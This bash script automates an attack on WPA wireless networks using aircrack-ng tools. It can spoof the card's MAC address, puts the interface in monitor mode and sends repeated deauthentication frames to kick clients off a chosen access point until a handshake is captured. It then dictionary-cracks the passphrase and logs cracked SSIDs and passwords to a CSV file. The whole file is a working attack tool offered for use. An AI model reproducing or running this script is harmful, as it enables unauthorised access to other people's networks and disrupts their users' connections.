#!/bin/bash

confirm_run_as_root(){
    if [ $UID -ne 0 ]
    then
        usage
        echo ""
        echo "Program must be run as root" 1>&2
        echo ""
        exit 1
    fi
}

usage(){
cat << EOF
Usage: $(basename $0) [options]

Options:
EOF

cat << EOF | column -s\& -t
-d|--dict & Specificy dictionary to use when cracking WPA.
-m|--mac & Change wireless's mac address with an anonymize mac.
-c|--channel & Channel to scan for targets.
-h|--help & Display Help
EOF

cat << EOF

Examples:
sudo ./$(basename $0) --dict wordlist.txt --mac
EOF
}

program_exist(){
    if [ ! `which iwconfig` ];then
        echo "Program iwconfig not found,you need to install wireless-tools"
        exit 1
    fi
    if [ ! `which aircrack-ng` ];then
        echo "Program aircrack-ng not found,you need to install aircrack-ng"
        exit 1
    fi
    if [ ! `which ifconfig` ];then
        echo "Program ifconfig not found,you need to install net-tools"
        exit 1
    fi
}

get_iface(){
    ifaces=($(iwconfig 2>/dev/null | grep -E '^[^ ]+ ' | awk '{print $1}'))
    if [ ${#ifaces[@]} -eq 1 ];then
        iface=${ifaces[0]}
    elif [ ${#ifaces[@]} -gt 1 ];then
        j=1
        for x in ${ifaces[@]};do
            echo -en "${j}: ${x}\t"
            let j++
        done
        echo ""
        while true;do
            read -p 'Please select the wireless number: ' iface_num
            [[ ${iface_num} -ge 1 && ${iface_num} -le ${#ifaces[@]} ]] && break
        done
        iface_num=$[${iface_num} - 1]
        iface=${ifaces[iface_num]}
    else
        echo "could not find wireless interface" 1>&2
        exit 1
    fi
}

stop_monitor_mode(){
    [ ${airodump_pid} ] && kill -15 ${airodump_pid} &>/dev/null
    iwconfig ${1} 2>/dev/null | grep -q 'Mode:Monitor'
    if [ $? -eq 0 ];then
        airmon-ng stop ${1} &>/dev/null
        echo ""
        echo "Stop Wireless interface Monitor mode: ${1}"
        echo ""
    fi
}

start_monitor_mode(){
    if [ ${mac_change} ];then
        iface_current_mac=$(printf ${iface_origin_mac::8}:%02X:%02X:%02X \
        $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] | tr [A-Z] [a-z])
        ifconfig ${1} down && ifconfig ${1} hw ether ${iface_current_mac}
        if [ $? -eq 0 ];then
            echo -en "Change ${1}'s MAC from ${iface_origin_mac} to ${iface_current_mac}..."
        fi
        ifconfig ${1} up && echo "done"
    fi
    airmon-ng start ${1} &>/dev/null && echo "Start Wireless interface Monitor mode: ${1}"
}

get_ap_info(){
    ap_channel=$(cat ${temp_dir}/wifite-01.csv | grep "^${ap_bssid}" | cut -d ',' -f 4)
    ap_ssid=$(cat ${temp_dir}/wifite-01.csv | grep "^${ap_bssid}" \
    | cut -d ',' -f 14 | sed 's/[^0-9a-zA-Z_-]//g')
    expr ${ap_channel} + 0 &>/dev/null
    if [ $? -ne 0 ];then
        while true;do
            read -p 'Please select the ap channel manually: ' ap_channel
            expr ${ap_channel} + 0 &>/dev/null && break
        done
    fi
    if [ -z ${ap_ssid} ];then
        while true;do
            read -p 'Please select the ap ssid manually: ' ap_ssid
            ap_ssid=$(echo ${ap_ssid} | sed 's/[^0-9a-zA-Z_-]//g')
            [ -z ${ap_ssid} ] || break
        done
    fi
}

send_deauth(){
    i=0
    clients=($(cat ${temp_dir}/handshake-01.csv \
        | grep -E "${mac_pattern}.*${mac_pattern}" | grep -oE "^${mac_pattern}"))
        if [ ${#clients[@]} -gt 0 ];then
            for client in ${clients[*]};do
                aireplay_cmd=(aireplay-ng --ignore-negative-one --deauth 1 -a)
                aireplay_cmd[${#aireplay_cmd[@]}]=${ap_bssid}
                aireplay_cmd[${#aireplay_cmd[@]}]='-c'
                aireplay_cmd[${#aireplay_cmd[@]}]=${client}
                aireplay_cmd[${#aireplay_cmd[@]}]=${iface}
                ${aireplay_cmd[*]} &>/dev/null
                echo -en "\rSending deauth to ${client}"
                sleep 1
                i=$[$i + 1]
            done
        fi
    if [ ${i} -eq 1 ];then
        echo -en "\nSending deauth to ${i} client..."
        sleep 10
    elif [ ${i} -gt 1 ];then
        echo -en "\nSending deauth to ${i} clients..."
        sleep 10
    else
        echo -en "\rWaiting clients to connecting......"
        sleep 1
    fi
}

handshake_check(){
    echo"" | aircrack-ng -a 2 -w - -b ${ap_bssid} ${temp_dir}/handshake-01.cap \
    2>/dev/null | grep -q 'Passphrase not in dictionary'
    if [ $? -eq 0 ];then
        stop_monitor_mode ${iface}
        apbssid=$(echo ${ap_bssid} | tr ":" "-")
        cap_time=$(date '+%M%S')
        cap_file=${cap_dir}/${ap_ssid}_${apbssid}_${cap_time}
        cp ${temp_dir}/handshake-01.cap ${cap_file}.cap
        if [ -f ${CURRENT_DIR}/cap2hccapx.bin ];then
            [ -x ${CURRENT_DIR}/cap2hccapx.bin ] || chmod 555 ${CURRENT_DIR}/cap2hccapx.bin
            ${CURRENT_DIR}/cap2hccapx.bin ${cap_file}.cap ${cap_file}.hccapx &>/dev/null
        fi
        echo -e "Success!saved as ${cap_file}.cap"
        return 0
    else
        return 1
    fi
}

wpa_aircrack(){
    if [ ${dict_file} ];then
        su ${user} -c "aircrack-ng -a 2 -w ${dict_file} -l \
        ${temp_dir}/wpakey.txt -b ${ap_bssid} ${cap_file}.cap"
    else
        exit 0
    fi
    if [ -f ${temp_dir}/wpakey.txt ];then
        echo ""
        echo "Crack success!saved key to ${cracked_csv}..."
        password=$(cat ${temp_dir}/wpakey.txt)
        echo "${ap_ssid},${apbssid},${password}" >> ${cracked_csv}
    fi
}

initialization(){
    confirm_run_as_root
    user=$(who | awk '{print $1}')
    program_exist
    iwconfig 2>/dev/null | grep -E '^[^ ]+ ' | awk '{print $1}' | while read line;do
        stop_monitor_mode ${line}
    done
    temp_dir=$(mktemp -t -d WifiteXXXXXX)
    [ -d ${temp_dir} ] && chmod 777 ${temp_dir}
    cap_dir=${CURRENT_DIR}/handshake
    [ -d ${cap_dir} ] || mkdir -p ${cap_dir}
    cracked_csv=${CURRENT_DIR}/cracked.csv
    [ -f ${cracked_csv} ] || echo "SSID,BSSID,PASSWORD" > ${cracked_csv}
    mac_pattern='([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}'
}

scan_interface(){
    get_iface
    iface_origin_mac=$(ifconfig ${iface} | grep -oE ${mac_pattern})
    [ -n ${iface_origin_mac} ] && start_monitor_mode ${iface}
    sleep 1
    iface=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
    airodump_cmd=(airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite)
    if [ ${channel} ];then
        airodump_cmd[${#airodump_cmd[@]}]='-c'
        airodump_cmd[${#airodump_cmd[@]}]=${channel}
    fi
    airodump_cmd[${#airodump_cmd[@]}]=${iface}
    ${airodump_cmd[*]}
}

wpa_attack(){
    trap "stop_monitor_mode ${iface} && exit 0" SIGINT
    while true;do
        read -p 'Please select target BSSID to Crack: ' ap_bssid
        echo ${ap_bssid} | grep -oqE "^${mac_pattern}$" && break
    done
    get_ap_info
    airodump_cmd=(airodump-ng -w ${temp_dir}/handshake --write-interval 1 --bssid)
    airodump_cmd[${#airodump_cmd[@]}]=${ap_bssid}
    airodump_cmd[${#airodump_cmd[@]}]='-c'
    airodump_cmd[${#airodump_cmd[@]}]=${ap_channel}
    airodump_cmd[${#airodump_cmd[@]}]=${iface}
    ${airodump_cmd[*]} &>/dev/null &
    airodump_pid="$!"
    echo "Start sending deauth,please waiting..."
    sleep 5
    while true;do
        handshake_check && break
        send_deauth
    done
}

CURRENT_DIR=$(cd `dirname $0`;pwd)
cd ${CURRENT_DIR}

while true;do
    case $1 in
        -d|--dict)
        if [ -r $2 ];then
            dict_file=${CURRENT_DIR}/${2##*/}
        else
            echo "Can't find dictionary,file $2 don't exist" 1>&2
            echo "Option $1 must be an exist dictionary file" 1>&2
            exit 1
        fi
        shift;;
        -m|--mac)
        mac_change=0;;
        -c|--channel)
        expr $2 + 0 &>/dev/null
        if [ $? -eq 0 ];then
            [[ $2 -ge 1 && $2 -le 13 ]] && channel=$2
        else
            echo "Option $1 must be a number between 1-13" 1>&2
            exit 1
        fi
        shift;;
        -h|--help)
        usage
        exit 0;;
        --)
        shift
        break;;
        *)
        shift
        break;;
    esac
    shift
done

initialization
scan_interface
wpa_attack
wpa_aircrack
